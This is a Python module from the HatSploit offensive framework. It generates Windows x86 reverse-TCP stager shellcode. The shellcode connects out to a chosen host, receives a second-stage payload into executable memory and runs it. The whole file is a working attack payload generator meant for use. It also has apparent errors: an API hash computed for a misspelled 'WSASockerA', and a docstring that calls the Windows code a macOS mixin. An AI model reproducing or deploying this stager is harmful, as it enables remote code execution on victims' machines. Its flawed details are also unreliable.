"""
MIT License

Copyright (c) 2020-2024 EntySec

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""

from textwrap import dedent
from typing import Optional

from pex.text import Text
from pex.socket import Socket

from .blocks import Blocks
from .exit import Exit

from hatsploit.lib.base import BaseMixin
from hatsploit.lib.ui.option import (
    BooleanOption,
    IntegerOption,
    Option
)


class ReverseTCP(BaseMixin):
    """ Subclass of pawn.windows.x86 module.

    This subclass of pawn.windows.x86 module is intended for providing
    an implementation of reverse TCP payload or stage0.
    """

    def __init__(self, info: dict = {}) -> None:
        """ Initialize macOS mixin.

        :param dict info: mixin info
        :return None: None
        """

        super().__init__(info)

        self.reliable = BooleanOption(
            'StageReliable',
            'no',
            "Add error checks to payload.",
            False,
            advanced=True
        )
        self.length = IntegerOption(
            'StageLength',
            None,
            "Length of next stage (empty to read length).",
            False,
            advanced=True
        )
        self.retries = IntegerOption(
            'StageRetries',
            1,
            'Number of retries.',
            True,
            advanced=True
        )
        self.exitfunc = Option(
            'StageExitFunc',
            'thread',
            'Exit function.',
            True,
            advanced=True
        )

        self.text = Text()

    def get_payload(self) -> bytes:
        """ Generate reverse TCP payload or stage0.

        :return bytes: shellcode
        """

        payload = dedent(f"""\
        init:
            cld
            call start

        {Blocks().x86_api_call()}

        start:
            pop ebp

        {self.block_reverse_tcp(
            host=self.rhost.value,
            port=self.rport.value,
            retries=self.retries.value,
            exit=self.exitfunc.value)}

        {self.block_recv(
            length=self.length.value,
            reliable=self.reliable.value,
            exit=self.exitfunc.value)}
        """)

        return self.__asm__(payload)

    def block_reverse_tcp(self, host: str, port: int,
                          retries: int = 1, exit: str = 'thread') -> str:
        """ Generate reverse TCP block.

        :param str host: reverse TCP host
        :param int port: reverse TCP port
        :param int retries: connection retries
        :param str exit: exit type
        :return str: block
        """

        host = "0x%08x" % Socket().host(host)
        port = "0x%08x" % Socket().port(port)

        block = dedent(f"""\
        reverse_tcp:
            push 0x3233
            push 0x5f327377
            push esp
            push {self.text.block_api_hash('kernel32.dll', 'LoadLibraryA')}
            mov  eax, ebp
            call eax

            mov  eax, 0x0190
            sub  esp, eax
            push esp
            push eax
            push {self.text.block_api_hash('ws2_32.dll', 'WSAStartup')}
            call ebp

            push {str(retries)}

        socket:
            push {host}
            push {port}
            mov  esi, esp

            push eax
            push eax
            push eax
            push eax
            inc  eax
            push eax
            inc  eax
            push eax
            push {self.text.block_api_hash('ws2_32.dll', 'WSASockerA')}
            call ebp
            xchg edi, eax
        """)

        block += dedent(f"""\
        connect:
            push 16
            push esi
            push edi
            push {self.text.block_api_hash('ws2_32.dll', 'connect')}
            call ebp

            test eax, eax
            jz   success

            dec dword ptr [esi+8]
            jnz connect
        """)

        if exit:
            block += dedent(f"""\
            fail:
                call exit
            """)
        else:
            block += dedent(f"""\
            fail:
                push {self.text.block_api_hash('kernel32.dll', 'ExitProcess')}
                call ebp
            """)

        block += dedent(f"""\
        success:
        """)

        return block

    def block_recv(self, length: Optional[int] = None, reliable: bool = True, exit: str = 'thread') -> str:
        """ Generate recv() block.

        :param Optional[int] length: length of second stage
        :param bool reliable: True if reliable else False
        :param str exit: exit type
        :return str: block
        """

        if length:
            block = dedent(f"""\
            recv:
                push {hex(length)}
                pop  esi
            """)

        else:
            block = dedent(f"""\
            recv:
                push 0
                push 4
                push esi
                push edi
                push {self.text.block_api_hash('ws2_32.dll', 'recv')}
                call ebp
            """)

            if reliable:
                block += dedent("""\
                    cmp eax, 0
                    jle cleanup
                """)

            block += dedent("""\
                mov esi, [esi]
            """)

        block += dedent(f"""\
            push 0x40
            push 0x1000
            push esi
            push 0
            push {self.text.block_api_hash('kernel32.dll', 'VirtualAlloc')}
            call ebp
            xchg ebx, eax
            push ebx

        read_more:
            push 0
            push esi
            push ebx
            push edi
            push {self.text.block_api_hash('ws2_32.dll', 'recv')}
            call ebp
        """)

        if reliable:
            block += dedent(f"""\
                cmp eax, 0
                jge continue
                pop eax
                push 0x4000
                push 0
                push eax
                push {self.text.block_api_hash('kernel32.dll', 'VirtualFree')}
                call ebp

            cleanup:
                push edi
                push {self.text.block_api_hash('ws2_32.dll', 'closesocket')}
                call ebp

                pop esi
                pop esi
                dec dword ptr [esp]

                jnz cleanup
                jmp fail
            """)

        block += dedent("""\
        continue:
            add ebx, eax
            sub esi, eax
            jnz read_more
            ret
        """)

        if exit:
            block += Exit().exit_block(exit)

        return block
